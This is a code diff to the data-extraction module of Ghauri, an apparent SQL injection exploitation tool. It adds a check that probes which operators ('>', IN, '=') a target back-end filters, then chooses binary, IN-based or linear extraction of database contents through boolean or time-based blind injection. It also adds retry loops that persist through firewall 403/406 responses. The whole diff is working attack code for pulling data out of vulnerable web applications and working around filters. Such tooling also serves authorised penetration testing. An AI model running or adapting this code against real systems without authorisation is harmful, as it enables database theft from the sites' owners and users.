@@ -56,9 +56,227 @@ from ghauri.common.utils import (
 class GhauriExtractor:
     """aa"""
 
-    def __init__(self, vectors="", is_string=False):
+    def __init__(self, vectors="", is_string=False, skip_urlencodig=False):
         self.vectors = vectors
         self.is_string = is_string
+        self.skip_urlencodig = skip_urlencodig
+
+    def _check_operator(
+        self,
+        url,
+        data,
+        vector,
+        parameter,
+        headers,
+        base,
+        injection_type,
+        proxy=None,
+        is_multipart=False,
+        timeout=30,
+        delay=0,
+        timesec=5,
+        attack01=None,
+        match_string=None,
+        not_match_string=None,
+        vector_type=None,
+        text_only=False,
+        retry=3,
+    ):
+        GuessUsing = collections.namedtuple(
+            "GuessUsing",
+            ["ok", "binary_search", "in_based_search", "linear_search", "msg"],
+        )
+        binary_search = False
+        in_based_search = False
+        linear_search = False
+        retry_on_error = 0
+        http_firewall_code_counter = 0
+        error_msg = None
+        _temp = GuessUsing(
+            ok=False,
+            binary_search=binary_search,
+            in_based_search=in_based_search,
+            linear_search=linear_search,
+            msg=None,
+        )
+        expressions = [
+            {
+                "expression": vector.replace("[INFERENCE]", "6590>6420").replace(
+                    "[SLEEPTIME]", f"{timesec}"
+                ),
+                "type": "binary_search",
+            },
+            {
+                "expression": vector.replace(
+                    "[INFERENCE]", "(SELECT(45))IN(10,45,60)"
+                ).replace("[SLEEPTIME]", f"{timesec}"),
+                "type": "in_based_search",
+            },
+            {
+                "expression": vector.replace("[INFERENCE]", "09845=9845").replace(
+                    "[SLEEPTIME]", f"{timesec}"
+                ),
+                "type": "linear_search",
+            },
+        ]
+        start = 0
+        end = len(expressions)
+        while start < end:
+            entry = expressions[start]
+            expression = entry.get("expression")
+            _type = entry.get("type")
+            logger.payload(f"{expression}")
+            if http_firewall_code_counter > 2:
+                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                logger.warning(f"HTTP error code detected during run:")
+                choice = logger.read_input(
+                    f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
+                    batch=False,
+                    user_input="C",
+                )
+                if choice == "q":
+                    break
+                if choice == "c":
+                    http_firewall_code_counter = 0
+            if retry_on_error >= retry:
+                logger.warning(f"Ghauri detected connection errors multiple times")
+                choice = logger.read_input(
+                    f"how do you want to proceed? [(C)continue/(q)uit] ",
+                    batch=False,
+                    user_input="C",
+                )
+                if choice == "q":
+                    break
+                if choice == "c":
+                    retry_on_error = 0
+            if delay > 0:
+                time.sleep(delay)
+            try:
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timesec=timesec,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=expression,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
+                )
+                if attack.status_code in [403, 406]:
+                    logger.critical(
+                        f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+                    )
+                    time.sleep(0.5)
+                    error_msg = attack.error_msg
+                    http_firewall_code_counter += 1
+                    continue
+                logger.debug(
+                    f"sleep time: {timesec}, response time: {attack.response_time}"
+                )
+                if attack01 and vector_type == "boolean_vector":
+                    bool_retval = check_boolean_responses(
+                        base,
+                        attack,
+                        attack01,
+                        match_string=match_string,
+                    )
+                    result = bool_retval.vulnerable
+                    if result:
+                        if _type == "binary_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=True,
+                                in_based_search=in_based_search,
+                                linear_search=linear_search,
+                                msg="",
+                            )
+                        if _type == "in_based_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=True,
+                                linear_search=linear_search,
+                                msg="it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on IN() function",
+                            )
+                        if _type == "linear_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=in_based_search,
+                                linear_search=True,
+                                msg="it appears that the character '>' and function 'IN' both are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                            )
+                        break
+                if vector_type == "time_vector":
+                    response_time = attack.response_time
+                    if response_time >= timesec:
+                        if _type == "binary_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=True,
+                                in_based_search=in_based_search,
+                                linear_search=linear_search,
+                                msg=None,
+                            )
+                        if _type == "in_based_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=True,
+                                linear_search=linear_search,
+                                msg="it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on IN() function",
+                            )
+                        if _type == "linear_search":
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=in_based_search,
+                                linear_search=True,
+                                msg="it appears that the character '>' and function 'IN' both are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                            )
+                        break
+                start += 1
+            except KeyboardInterrupt as error:
+                logger.warning("user aborted during data extraction phase")
+                quest = logger.read_input(
+                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
+                    batch=False,
+                    user_input="C",
+                )
+                if quest and quest == "e":
+                    raise error
+                if quest and quest == "q":
+                    logger.error("user quit")
+                    logger.end("ending")
+                    exit(0)
+            except ConnectionAbortedError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except ConnectionRefusedError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except ConnectionResetError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except Exception as error:
+                logger.critical(
+                    f"error {error}, during operator check phase. Ghauri is going to retry"
+                )
+                retry_on_error += 1
+        logger.debug(_temp)
+        if _temp.ok:
+            if _temp.msg:
+                logger.warning(_temp.msg)
+        return _temp
 
     def validate_character(
         self,
@@ -76,6 +294,7 @@ class GhauriExtractor:
         timesec=5,
         attack01=None,
         match_string=None,
+        not_match_string=None,
         suppress_output=False,
         query_check=False,
         identified_character=None,
@@ -83,55 +302,126 @@ class GhauriExtractor:
         queryable=None,
         offset=None,
         expression_payload=None,
+        text_only=False,
+        retry=3,
     ):
         #  we will validate character indendified in case of boolean based blind sqli only for now..
         is_valid = False
+        retry_on_error = 0
+        http_firewall_code_counter = 0
+        error_msg = None
         if identified_character:
-            condition = expression_payload.format(
-                query=queryable,
-                position=offset,
-                char=ord(identified_character),
-            )
-            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
-                "[SLEEPTIME]", f"{timesec}"
-            )
-            sleep_time = timesec
-            # logger.debug(
-            #     f"verifiying the identified character is correct or not: '{identified_character}'"
-            # )
-            logger.payload(f"{expression}")
-            attack = inject_expression(
-                url=url,
-                data=data,
-                proxy=proxy,
-                delay=delay,
-                timesec=timesec,
-                timeout=timeout,
-                headers=headers,
-                parameter=parameter,
-                expression=expression,
-                is_multipart=is_multipart,
-                injection_type=injection_type,
-            )
-            logger.debug(
-                f"sleep time: {sleep_time}, response time: {attack.response_time}"
-            )
-            if attack01 and vector_type == "boolean_vector":
-                bool_retval = check_boolean_responses(
-                    base,
-                    attack,
-                    attack01,
-                    match_string=match_string,
+            for i in range(1, retry + 1):
+                if http_firewall_code_counter > 2:
+                    message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                    logger.warning(f"HTTP error code detected during run:")
+                    choice = logger.read_input(
+                        f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
+                        batch=False,
+                        user_input="C",
+                    )
+                    if choice == "q":
+                        break
+                    if choice == "c":
+                        http_firewall_code_counter = 0
+                if retry_on_error >= retry:
+                    logger.warning(f"Ghauri detected connection errors multiple times")
+                    choice = logger.read_input(
+                        f"how do you want to proceed? [(C)continue/(q)uit] ",
+                        batch=False,
+                        user_input="C",
+                    )
+                    if choice == "q":
+                        break
+                    if choice == "c":
+                        retry_on_error = 0
+                if delay > 0:
+                    time.sleep(delay)
+                condition = expression_payload.format(
+                    query=queryable,
+                    position=offset,
+                    char=ord(identified_character),
                 )
-                result = bool_retval.vulnerable
-                if result:
-                    is_valid = True
-                    logger.debug("character is valid.")
-            if vector_type == "time_vector":
-                response_time = attack.response_time
-                if response_time >= sleep_time:
-                    logger.debug("character is valid.")
-                    is_valid = True
+                expression = vector.replace("[INFERENCE]", f"{condition}").replace(
+                    "[SLEEPTIME]", f"{timesec}"
+                )
+                sleep_time = timesec
+                logger.payload(f"{expression}")
+                try:
+                    attack = inject_expression(
+                        url=url,
+                        data=data,
+                        proxy=proxy,
+                        delay=delay,
+                        timesec=timesec,
+                        timeout=timeout,
+                        headers=headers,
+                        parameter=parameter,
+                        expression=expression,
+                        is_multipart=is_multipart,
+                        injection_type=injection_type,
+                    )
+                    if attack.status_code in [403, 406]:
+                        logger.critical(
+                            f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+                        )
+                        time.sleep(0.5)
+                        error_msg = attack.error_msg
+                        http_firewall_code_counter += 1
+                        continue
+                    logger.debug(
+                        f"sleep time: {sleep_time}, response time: {attack.response_time}"
+                    )
+                    if attack01 and vector_type == "boolean_vector":
+                        bool_retval = check_boolean_responses(
+                            base,
+                            attack,
+                            attack01,
+                            match_string=match_string,
+                        )
+                        result = bool_retval.vulnerable
+                        if result:
+                            is_valid = True
+                            logger.debug("character is valid.")
+                    if vector_type == "time_vector":
+                        response_time = attack.response_time
+                        if response_time >= sleep_time:
+                            logger.debug("character is valid.")
+                            is_valid = True
+                    break
+                except KeyboardInterrupt as error:
+                    logger.warning("user aborted during data extraction phase")
+                    quest = logger.read_input(
+                        "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
+                        batch=False,
+                        user_input="C",
+                    )
+                    if quest and quest == "e":
+                        raise error
+                    if quest and quest == "q":
+                        logger.error("user quit")
+                        logger.end("ending")
+                        exit(0)
+                except ConnectionAbortedError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except ConnectionRefusedError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except ConnectionResetError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except Exception as error:
+                    logger.critical(
+                        f"error {error}, during detection phase. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
         return is_valid
 
     def _search_using_in_operator(
@@ -183,9 +473,6 @@ class GhauriExtractor:
 
         list_split_by = 26
         while not is_found:
-            # logger.debug(
-            #     f"splitting ascii characters by: {list_split_by}, (minimum={minimum}, maximum={maximum})"
-            # )
             sorted_ascii_list = list(
                 chunks(
                     sorted([str(i) for i in range(minimum, maximum + 1)]),
@@ -257,18 +544,41 @@ class GhauriExtractor:
                     logger.debug(
                         f"sleep time: {sleep_time}, response time: {response_time}"
                     )
-                    if response_time >= sleep_time:
-                        characters_list = sorted([int(i) for i in characters_list])
-                        minimum = characters_list[0]
-                        maximum = characters_list[-1]
-                        list_split_by = len(characters_list) // 2
-                        if len(characters_list) == 1:
-                            character = characters_list.pop()
-                            character = chr(int(character))
-                            is_found = True
-                        break
-                    else:
-                        index += 1
+                    if attack01 and vector_type == "boolean_vector":
+                        bool_retval = check_boolean_responses(
+                            base,
+                            attack,
+                            attack01,
+                            match_string=match_string,
+                            not_match_string=not_match_string,
+                            text_only=text_only,
+                        )
+                        result = bool_retval.vulnerable
+                        if result:
+                            characters_list = sorted([int(i) for i in characters_list])
+                            minimum = characters_list[0]
+                            maximum = characters_list[-1]
+                            list_split_by = len(characters_list) // 2
+                            if len(characters_list) == 1:
+                                character = characters_list.pop()
+                                character = chr(int(character))
+                                is_found = True
+                            break
+                        else:
+                            index += 1
+                    if vector_type == "time_vector":
+                        if response_time >= sleep_time:
+                            characters_list = sorted([int(i) for i in characters_list])
+                            minimum = characters_list[0]
+                            maximum = characters_list[-1]
+                            list_split_by = len(characters_list) // 2
+                            if len(characters_list) == 1:
+                                character = characters_list.pop()
+                                character = chr(int(character))
+                                is_found = True
+                            break
+                        else:
+                            index += 1
                 except KeyboardInterrupt as error:
                     logger.warning("user aborted during data extraction phase")
                     quest = logger.read_input(
@@ -484,17 +794,23 @@ class GhauriExtractor:
         headers,
         injection_type,
         proxy=None,
+        attack01=None,
         is_multipart=False,
         timeout=30,
         delay=0,
         timesec=5,
+        match_string=None,
+        not_match_string=None,
+        text_only=False,
         suppress_output=False,
         expression_payload=None,
         queryable=None,
         chars="",
         offset=0,
         list_of_chars=None,
+        vector_type=None,
         retry=3,
+        base=None,
     ):
         # need to implement retry mechanism in case of http connection related errors..
         character = ""
@@ -562,13 +878,27 @@ class GhauriExtractor:
                     http_firewall_code_counter += 1
                     continue
                 start += 1
-                response_time = attack.response_time
-                logger.debug(
-                    f"sleep time: {sleep_time}, response time: {response_time}"
-                )
-                if response_time >= sleep_time:
-                    character += str(ascii_char)
-                    break
+                if attack01 and vector_type == "boolean_vector":
+                    bool_retval = check_boolean_responses(
+                        base,
+                        attack,
+                        attack01,
+                        match_string=match_string,
+                        not_match_string=not_match_string,
+                        text_only=text_only,
+                    )
+                    result = bool_retval.vulnerable
+                    if result:
+                        character += str(ascii_char)
+                        break
+                if vector_type == "time_vector":
+                    response_time = attack.response_time
+                    logger.debug(
+                        f"sleep time: {sleep_time}, response time: {response_time}"
+                    )
+                    if response_time >= sleep_time:
+                        character += str(ascii_char)
+                        break
             except KeyboardInterrupt as error:
                 logger.warning("user aborted during data extraction phase")
                 quest = logger.read_input(
@@ -828,6 +1158,7 @@ class GhauriExtractor:
                                 chars=chars,
                                 offset=pos,
                                 list_of_chars="2013456789",
+                                vector_type=vector_type,
                             )
                             chars += retval
                             logger.debug(f"character found: '{str(chars)}'")
@@ -1069,10 +1400,13 @@ class GhauriExtractor:
         change_algo_on_invalid_character = False
         invalid_character_detection_counter = 0
         is_change_algo_notified = False
+        binary_search = False
+        in_based_search = False
+        linear_search = False
         for vector_type, vector in self.vectors.items():
             if vector_type in ["error_vector"]:
                 continue
-            logger.debug(f"testing now with vector '{vector}'")
+            # logger.debug(f"testing now with vector '{vector}'")
             length = self.fetch_length(
                 url,
                 data,
@@ -1105,6 +1439,35 @@ class GhauriExtractor:
             if query_check:
                 return PayloadResponse(ok=True, error="", result="", payload=length)
             is_done_with_vector = False
+            retval_check = self._check_operator(
+                url,
+                data,
+                vector,
+                parameter,
+                headers,
+                base,
+                injection_type,
+                proxy=proxy,
+                is_multipart=is_multipart,
+                timeout=timeout,
+                delay=delay,
+                timesec=timesec,
+                attack01=attack01,
+                match_string=match_string,
+                not_match_string=not_match_string,
+                vector_type=vector_type,
+                text_only=text_only,
+            )
+            if retval_check.ok:
+                binary_search = retval_check.binary_search
+                in_based_search = retval_check.in_based_search
+                linear_search = retval_check.linear_search
+            if not retval_check.ok:
+                logger.critical(
+                    "ghauri will not be able to extract data as '=', 'IN' and '>' all are filtered by back-end server.."
+                )
+                logger.end("ending")
+                exit(0)
             for entries in data_extraction_payloads:
                 is_extracted = False
                 for _, value in entries.items():
@@ -1118,34 +1481,90 @@ class GhauriExtractor:
                             if attack01 and vector_type == "boolean_vector":
                                 # extract characters using binary search algorithm
                                 try:
-                                    retval = self._binary_search(
-                                        url=url,
-                                        data=data,
-                                        vector=vector,
-                                        parameter=parameter,
-                                        headers=headers,
-                                        base=base,
-                                        injection_type=injection_type,
-                                        delay=delay,
-                                        timesec=timesec,
-                                        timeout=timeout,
-                                        proxy=proxy,
-                                        attack01=attack01,
-                                        code=code,
-                                        match_string=match_string,
-                                        not_match_string=not_match_string,
-                                        is_multipart=is_multipart,
-                                        suppress_output=suppress_output,
-                                        query_check=query_check,
-                                        minimum=32,
-                                        maximum=127,
-                                        offset=pos,
-                                        expression_payload=value,
-                                        queryable=entry,
-                                        chars=chars,
-                                        text_only=text_only,
-                                        vector_type=vector_type,
-                                    )
+                                    if binary_search:
+                                        retval = self._binary_search(
+                                            url=url,
+                                            data=data,
+                                            vector=vector,
+                                            parameter=parameter,
+                                            headers=headers,
+                                            base=base,
+                                            injection_type=injection_type,
+                                            delay=delay,
+                                            timesec=timesec,
+                                            timeout=timeout,
+                                            proxy=proxy,
+                                            attack01=attack01,
+                                            code=code,
+                                            match_string=match_string,
+                                            not_match_string=not_match_string,
+                                            is_multipart=is_multipart,
+                                            suppress_output=suppress_output,
+                                            query_check=query_check,
+                                            minimum=32,
+                                            maximum=127,
+                                            offset=pos,
+                                            expression_payload=value,
+                                            queryable=entry,
+                                            chars=chars,
+                                            text_only=text_only,
+                                            vector_type=vector_type,
+                                        )
+                                    elif in_based_search:
+                                        retval = self._search_using_in_operator(
+                                            url=url,
+                                            data=data,
+                                            vector=vector,
+                                            parameter=parameter,
+                                            headers=headers,
+                                            base=base,
+                                            injection_type=injection_type,
+                                            delay=delay,
+                                            timesec=timesec,
+                                            timeout=timeout,
+                                            proxy=proxy,
+                                            attack01=attack01,
+                                            match_string=match_string,
+                                            not_match_string=not_match_string,
+                                            text_only=text_only,
+                                            is_multipart=is_multipart,
+                                            suppress_output=suppress_output,
+                                            query_check=query_check,
+                                            minimum=32,
+                                            maximum=127,
+                                            offset=pos,
+                                            expression_payload=value,
+                                            queryable=entry,
+                                            chars=chars,
+                                            vector_type=vector_type,
+                                        )
+                                    else:
+                                        retval = self._linear_search(
+                                            url=url,
+                                            data=data,
+                                            vector=vector,
+                                            parameter=parameter,
+                                            headers=headers,
+                                            injection_type=injection_type,
+                                            proxy=proxy,
+                                            attack01=attack01,
+                                            is_multipart=is_multipart,
+                                            timeout=timeout,
+                                            match_string=match_string,
+                                            not_match_string=not_match_string,
+                                            text_only=text_only,
+                                            delay=delay,
+                                            timesec=timesec,
+                                            suppress_output=suppress_output,
+                                            expression_payload=value,
+                                            queryable=entry,
+                                            chars=chars,
+                                            offset=pos,
+                                            list_of_chars=list_of_chars,
+                                            vector_type=vector_type,
+                                            base=base,
+                                        )
+                                    pos += 1
                                     chars += retval
                                     logger.debug(f"character(s) found: '{str(chars)}'")
                                 except KeyboardInterrupt:
@@ -1239,6 +1658,7 @@ class GhauriExtractor:
                                             chars=chars,
                                             offset=pos,
                                             list_of_chars=list_of_chars,
+                                            vector_type=vector_type,
                                         )
                                         chars += retval
                                         pos += 1
